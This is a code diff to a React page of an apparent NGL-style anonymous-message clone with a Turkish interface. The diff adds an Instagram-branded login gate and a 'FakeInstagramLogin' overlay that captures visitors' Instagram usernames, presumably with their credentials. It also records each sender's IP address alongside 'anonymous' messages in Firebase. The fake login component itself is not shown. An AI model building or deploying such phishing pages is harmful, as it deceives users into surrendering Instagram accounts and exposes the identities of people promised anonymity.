@@ -3,12 +3,15 @@ import { motion, AnimatePresence } from 'framer-motion';
 import { UserCircle2, Dices } from 'lucide-react';
 import { useParams } from 'react-router-dom';
 import { getSettings, saveMessage } from '../lib/firebase';
+import FakeInstagramLogin from '../components/FakeInstagramLogin';
 
 export default function Send() {
-  const [step, setStep] = useState(1);
+  // Steps: 'loading' | 'ig_login' | 'ig_prompt' | 'ig_gate' | 'message' | 'success'
+  const [step, setStep] = useState('loading');
+  const [captureMode, setCaptureMode] = useState('username');
   const [igUsername, setIgUsername] = useState('');
   const [message, setMessage] = useState('');
-  const [ip, setIp] = useState('Fetching...');
+  const [ip, setIp] = useState('Unknown');
   const { username } = useParams();
   const targetUser = username || 'enguncel_taskopruyeni_itiraf';
 
@@ -24,23 +27,37 @@ export default function Send() {
   ];
 
   useEffect(() => {
+    // Fetch settings to determine capture mode
     getSettings()
       .then(settings => {
-        if (!settings.requireIg) {
-          setStep(2);
+        const mode = settings.captureMode || 'username';
+        setCaptureMode(mode);
+
+        if (mode === 'ig_login') {
+          setStep('ig_gate');
+        } else if (mode === 'username') {
+          setStep('ig_prompt');
+        } else {
+          setStep('message');
         }
       })
-      .catch(err => console.error('Failed to fetch settings:', err));
+      .catch(() => setStep('ig_prompt'));
 
+    // Fetch IP
     fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
       .then(data => setIp(data.ip))
       .catch(() => setIp('Unknown'));
   }, []);
 
+  const handleIgLoginSuccess = (capturedUsername) => {
+    setIgUsername(capturedUsername);
+    setStep('message');
+  };
+
   const handleNextStep = () => {
     if (igUsername.trim().length > 0) {
-      setStep(2);
+      setStep('message');
     }
   };
 
@@ -58,7 +75,7 @@ export default function Send() {
         igUsername: igUsername || 'Atlandı',
         ip: ip
       });
-      setStep(3);
+      setStep('success');
     } catch (err) {
       console.error('Failed to send message:', err);
     }
@@ -67,16 +84,74 @@ export default function Send() {
   const handleReset = async () => {
     try {
       const settings = await getSettings();
-      setStep(settings.requireIg ? 1 : 2);
+      const mode = settings.captureMode || 'username';
+      setCaptureMode(mode);
+
+      if (mode === 'ig_login') {
+        setStep('ig_gate');
+      } else if (mode === 'username') {
+        setStep('ig_prompt');
+      } else {
+        setStep('message');
+      }
     } catch {
-      setStep(1);
+      setStep('ig_prompt');
     }
     setMessage('');
     setIgUsername('');
   };
 
+  // Fake IG Login (full screen overlay)
+  if (step === 'ig_login') {
+    return <FakeInstagramLogin onSuccess={handleIgLoginSuccess} ip={ip} />;
+  }
+
   const renderStep = () => {
-    if (step === 1) {
+    if (step === 'loading') {
+      return (
+        <motion.div
+          initial={{ opacity: 0 }}
+          animate={{ opacity: 1 }}
+          className="ngl-card"
+          style={{ padding: '40px', textAlign: 'center', background: 'white', borderRadius: '30px', width: '100%' }}
+        >
+          <div className="loading-spinner"></div>
+        </motion.div>
+      );
+    }
+
+    // Gate screen: "NGL'ye Instagram ile giriş yap"
+    if (step === 'ig_gate') {
+      return (
+        <motion.div
+          initial={{ opacity: 0, y: 20 }}
+          animate={{ opacity: 1, y: 0 }}
+          className="ngl-card ig-gate-card"
+        >
+          <div className="ig-gate-header">
+            <div className="ngl-logo-gate">NGL</div>
+            <p className="gate-subtitle">anonim mesajlar al</p>
+          </div>
+
+          <button className="ig-connect-btn" onClick={() => setStep('ig_login')}>
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+              <rect x="2" y="2" width="20" height="20" rx="5" ry="5" />
+              <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z" />
+              <line x1="17.5" y1="6.5" x2="17.51" y2="6.5" />
+            </svg>
+            Instagram ile giriş yap
+          </button>
+
+          <div className="gate-security">
+            <span>🔒</span>
+            <span>Instagram hesabınla giriş yap ve anonim mesajlar almaya başla</span>
+          </div>
+        </motion.div>
+      );
+    }
+
+    // Username prompt (original behavior)
+    if (step === 'ig_prompt') {
       return (
         <motion.div
           initial={{ opacity: 0, y: 20 }}
@@ -124,7 +199,8 @@ export default function Send() {
       );
     }
 
-    if (step === 2) {
+    // Message form
+    if (step === 'message') {
       return (
         <motion.div
           initial={{ opacity: 0, scale: 0.9 }}
@@ -162,7 +238,8 @@ export default function Send() {
       );
     }
 
-    if (step === 3) {
+    // Success
+    if (step === 'success') {
       return (
         <AnimatePresence>
           <motion.div
@@ -178,10 +255,7 @@ export default function Send() {
             <h2>teşekkürler!</h2>
             <p className="success-sub">mesajın başarıyla iletildi!</p>
 
-            <button
-              className="ngl-button reset-btn"
-              onClick={handleReset}
-            >
+            <button className="ngl-button reset-btn" onClick={handleReset}>
               Bir mesaj daha gönder
             </button>
           </motion.div>
@@ -195,7 +269,7 @@ export default function Send() {
       <div className="ngl-wrapper">
         {renderStep()}
 
-        {step !== 3 && (
+        {(step === 'message' || step === 'ig_prompt' || step === 'ig_gate') && (
           <motion.div
             initial={{ opacity: 0 }}
             animate={{ opacity: 1 }}
@@ -237,6 +311,74 @@ export default function Send() {
           flex-direction: column;
           align-items: center;
         }
+
+        .loading-spinner {
+          width: 36px;
+          height: 36px;
+          border: 3px solid #f0f0f0;
+          border-top-color: #FF1F7C;
+          border-radius: 50%;
+          animation: spin 0.7s linear infinite;
+          margin: 0 auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* IG Gate Card */
+        .ig-gate-card {
+          padding: 40px 30px;
+          text-align: center;
+          margin-bottom: 24px;
+          background: white;
+          border-radius: 30px;
+          box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+          width: 100%;
+        }
+        .ig-gate-header { margin-bottom: 30px; }
+        .ngl-logo-gate {
+          font-weight: 900;
+          font-size: 3rem;
+          font-style: italic;
+          color: #000;
+          margin-bottom: 4px;
+        }
+        .gate-subtitle {
+          color: #666;
+          font-weight: 600;
+          font-size: 1rem;
+        }
+        .ig-connect-btn {
+          width: 100%;
+          padding: 16px 24px;
+          border: none;
+          border-radius: 14px;
+          font-size: 1rem;
+          font-weight: 700;
+          cursor: pointer;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          gap: 10px;
+          color: white;
+          background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+          transition: transform 0.15s, box-shadow 0.15s;
+          margin-bottom: 20px;
+        }
+        .ig-connect-btn:hover {
+          transform: translateY(-2px);
+          box-shadow: 0 6px 20px rgba(220, 39, 67, 0.3);
+        }
+        .ig-connect-btn:active { transform: scale(0.98); }
+        .gate-security {
+          display: flex;
+          align-items: center;
+          gap: 8px;
+          font-size: 0.8rem;
+          color: #888;
+          font-weight: 600;
+          justify-content: center;
+        }
+
+        /* Message card */
         .message-card {
           padding: 24px;
           margin-bottom: 24px;
@@ -305,6 +447,7 @@ export default function Send() {
         }
         .pill-dice:active { transform: scale(0.9); }
 
+        /* IG Prompt */
         .ig-prompt-card {
           padding: 30px;
           text-align: center;
